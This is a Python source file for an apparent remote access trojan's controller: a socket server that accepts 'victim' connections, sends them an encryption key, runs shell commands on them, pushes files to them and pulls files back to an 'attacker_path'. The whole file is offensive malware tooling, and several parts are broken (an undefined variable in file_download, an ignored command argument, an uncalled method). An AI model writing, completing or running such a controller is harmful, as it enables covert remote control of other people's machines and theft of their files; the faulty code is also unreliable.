import socket
from flask import *
import os
import time
import threading
from cryptography.fernet import Fernet, InvalidToken


class Handler():
    def decrypt(self, data):
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        return self.fernet.encrypt(data.encode())

    def refresh_connections(self):
        while True:
            if not threading.main_thread().is_alive():
                self.server.close()
                exit()
            for conn_i in self.connections:
                conn = conn_i[0]
                try:
                    conn.send(self.encrypt("alive:alive"))
                except:
                    self.connections.remove(conn_i)
            time.sleep(10)

    def check_connections(self):
        return self.connections

    def rce(self, id, cmd):
        """Send a Cmd to Victim and return Output"""
        conn, addr = self.connections[id]
        cmd = input("CMD: ")
        conn.send(self.encrypt(f"CMD:{cmd}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def get_device_infos(self, id):
        """Send Commands to get Hostname, Ip, Os, Users, etc."""
        pass

    def start(self):
        self.server.listen()
        while True:
            conn, addr = self.server.accept()
            self.connections.append((conn, addr))
            conn.send(self.key)
            conn.sendfile

    def setup(self):
        self.connections = []
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        PORT = 1234
        SERVER = socket.gethostbyname(socket.gethostname())
        ADDR = (SERVER, PORT)

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(ADDR)
        threading.Thread(target=self.start).start()
        threading.Thread(target=self.refresh_connections).start()

    def file_upload(self, id, fil, path):
        conn, addr = self.connections[id]
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
            time.sleep(1)
            conn.sendfile(f)
            status = self.decrypt(conn.recv(1024))
            if status == "0":
                raise Exception
        except:
            return False
        else:
            return True
    def file_download(self, id, target_path, attacker_path):
        conn, addr = self.connections[id]
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-d:{target_path}"))
            fil = conn.recv(1024)
            if fil == "0":
                raise Exception
            with open(attacker_path, "wb") as f:
                f.write(fil)
        except:
            return False
        else:
            return True

    def __init__(self):
        self.setup()

Handler()
